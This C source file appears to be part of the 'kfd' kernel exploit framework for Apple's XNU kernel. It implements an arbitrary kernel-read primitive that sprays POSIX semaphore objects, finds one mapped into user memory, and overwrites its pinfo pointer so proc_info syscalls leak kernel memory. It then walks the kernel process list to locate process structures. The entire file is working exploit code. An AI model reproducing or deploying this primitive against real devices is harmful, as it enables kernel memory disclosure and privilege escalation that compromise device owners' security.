/*
 * Copyright (c) 2023 Félix Poulin-Bélanger. All rights reserved.
 */

const char* kread_sem_open_name = "kfd-posix-semaphore";
u64 kread_sem_open_kread_u64(struct kfd* kfd, u64 kaddr);
u32 kread_sem_open_kread_u32(struct kfd* kfd, u64 kaddr);

void kread_sem_open_init(struct kfd* kfd) {
    kfd->kread.krkw_maximum_id = kfd->info.env.maxfilesperproc - 100;
    kfd->kread.krkw_object_size = sizeof(struct psemnode);
    kfd->kread.krkw_method_data_size = ((kfd->kread.krkw_maximum_id + 1) * (sizeof(i32))) + sizeof(struct psem_fdinfo);
    kfd->kread.krkw_method_data = malloc_bzero(kfd->kread.krkw_method_data_size);
    sem_unlink(kread_sem_open_name);
    i32 sem_fd = (i32)(usize)(sem_open(kread_sem_open_name, (O_CREAT | O_EXCL), (S_IRUSR | S_IWUSR), 0));
    assert(sem_fd > 0);
    i32* fds = (i32*)(kfd->kread.krkw_method_data);
    fds[kfd->kread.krkw_maximum_id] = sem_fd;
    struct psem_fdinfo* sem_data = (struct psem_fdinfo*)(&fds[kfd->kread.krkw_maximum_id + 1]);
    i32 callnum = PROC_INFO_CALL_PIDFDINFO;
    i32 pid = kfd->info.env.pid;
    u32 flavor = PROC_PIDFDPSEMINFO;
    u64 arg = sem_fd;
    u64 buffer = (u64)(sem_data);
    i32 buffersize = (i32)(sizeof(struct psem_fdinfo));
    assert(syscall(SYS_proc_info, callnum, pid, flavor, arg, buffer, buffersize) == buffersize);
}

void kread_sem_open_allocate(struct kfd* kfd, u64 id) {
    i32 fd = (i32)(usize)(sem_open(kread_sem_open_name, 0, 0, 0));
    assert(fd > 0);
    i32* fds = (i32*)(kfd->kread.krkw_method_data);
    fds[id] = fd;
}

bool kread_sem_open_search(struct kfd* kfd, u64 object_uaddr) {
    volatile struct psemnode* pnode = (volatile struct psemnode*)(object_uaddr);
    i32* fds = (i32*)(kfd->kread.krkw_method_data);
    struct psem_fdinfo* sem_data = (struct psem_fdinfo*)(&fds[kfd->kread.krkw_maximum_id + 1]);
    if ((pnode[0].pinfo > pac_mask) &&
        (pnode[1].pinfo == pnode[0].pinfo) &&
        (pnode[2].pinfo == pnode[0].pinfo) &&
        (pnode[3].pinfo == pnode[0].pinfo) &&
        (pnode[0].padding == 0) &&
        (pnode[1].padding == 0) &&
        (pnode[2].padding == 0) &&
        (pnode[3].padding == 0)) {
        for (u64 object_id = kfd->kread.krkw_searched_id; object_id < kfd->kread.krkw_allocated_id; object_id++) {
            struct psem_fdinfo data = {};
            i32 callnum = PROC_INFO_CALL_PIDFDINFO;
            i32 pid = kfd->info.env.pid;
            u32 flavor = PROC_PIDFDPSEMINFO;
            u64 arg = fds[object_id];
            u64 buffer = (u64)(&data);
            i32 buffersize = (i32)(sizeof(struct psem_fdinfo));
            const u64 shift_amount = 4;
            pnode[0].pinfo += shift_amount;
            assert(syscall(SYS_proc_info, callnum, pid, flavor, arg, buffer, buffersize) == buffersize);
            pnode[0].pinfo -= shift_amount;
            if (!memcmp(&data.pseminfo.psem_name[0], &sem_data->pseminfo.psem_name[shift_amount], 16)) {
                kfd->kread.krkw_object_id = object_id;
                return true;
            }
        }
        printf("failed to find modified psem_name sentinel\n");
    }
    return false;
}

void kread_sem_open_kread(struct kfd* kfd, u64 kaddr, void* uaddr, u64 size) {
    kread_from_method(u64, kread_sem_open_kread_u64);
}

void kread_sem_open_find_proc(struct kfd* kfd) {
    u64 pseminfo_kaddr = ((volatile struct psemnode*)(kfd->kread.krkw_object_uaddr))->pinfo;
    u64 semaphore_kaddr = kget_u64(pseminfo__psem_semobject, pseminfo_kaddr);
    u64 task_kaddr = kget_u64(semaphore__owner, semaphore_kaddr);
    u64 proc_kaddr = task_kaddr - kfd_offset(proc__object_size);
    kfd->info.kaddr.kernel_proc = proc_kaddr;
    while (true) {
        i32 pid = kget_u64(proc__p_pid, proc_kaddr);
        if (pid == kfd->info.env.pid) {
            kfd->info.kaddr.current_proc = proc_kaddr;
            break;
        }
        proc_kaddr = kget_u64(proc__p_list__le_prev, proc_kaddr);
    }
}

void kread_sem_open_deallocate(struct kfd* kfd, u64 id) {
    return;
}

void kread_sem_open_free(struct kfd* kfd) {
    kfd->kread.krkw_method_data = NULL;
}

u64 kread_sem_open_kread_u64(struct kfd* kfd, u64 kaddr) {
    i32* fds = (i32*)(kfd->kread.krkw_method_data);
    i32 kread_fd = fds[kfd->kread.krkw_object_id];
    u64 psemnode_uaddr = kfd->kread.krkw_object_uaddr;
    u64 old_pinfo = ((volatile struct psemnode*)(psemnode_uaddr))->pinfo;
    u64 new_pinfo = kaddr - kfd_offset(pseminfo__psem_uid);
    ((volatile struct psemnode*)(psemnode_uaddr))->pinfo = new_pinfo;
    struct psem_fdinfo data = {};
    i32 callnum = PROC_INFO_CALL_PIDFDINFO;
    i32 pid = kfd->info.env.pid;
    u32 flavor = PROC_PIDFDPSEMINFO;
    u64 arg = kread_fd;
    u64 buffer = (u64)(&data);
    i32 buffersize = (i32)(sizeof(struct psem_fdinfo));
    assert(syscall(SYS_proc_info, callnum, pid, flavor, arg, buffer, buffersize) == buffersize);
    ((volatile struct psemnode*)(psemnode_uaddr))->pinfo = old_pinfo;
    return *(u64*)(&data.pseminfo.psem_stat.vst_uid);
}

u32 kread_sem_open_kread_u32(struct kfd* kfd, u64 kaddr) {
    i32* fds = (i32*)(kfd->kread.krkw_method_data);
    i32 kread_fd = fds[kfd->kread.krkw_object_id];
    u64 psemnode_uaddr = kfd->kread.krkw_object_uaddr;
    u64 old_pinfo = ((volatile struct psemnode*)(psemnode_uaddr))->pinfo;
    u64 new_pinfo = kaddr - kfd_offset(pseminfo__psem_usecount);
    ((volatile struct psemnode*)(psemnode_uaddr))->pinfo = new_pinfo;
    struct psem_fdinfo data = {};
    i32 callnum = PROC_INFO_CALL_PIDFDINFO;
    i32 pid = kfd->info.env.pid;
    u32 flavor = PROC_PIDFDPSEMINFO;
    u64 arg = kread_fd;
    u64 buffer = (u64)(&data);
    i32 buffersize = (i32)(sizeof(struct psem_fdinfo));
    assert(syscall(SYS_proc_info, callnum, pid, flavor, arg, buffer, buffersize) == buffersize);
    ((volatile struct psemnode*)(psemnode_uaddr))->pinfo = old_pinfo;
    return *(u32*)(&data.pseminfo.psem_stat.vst_size);
}
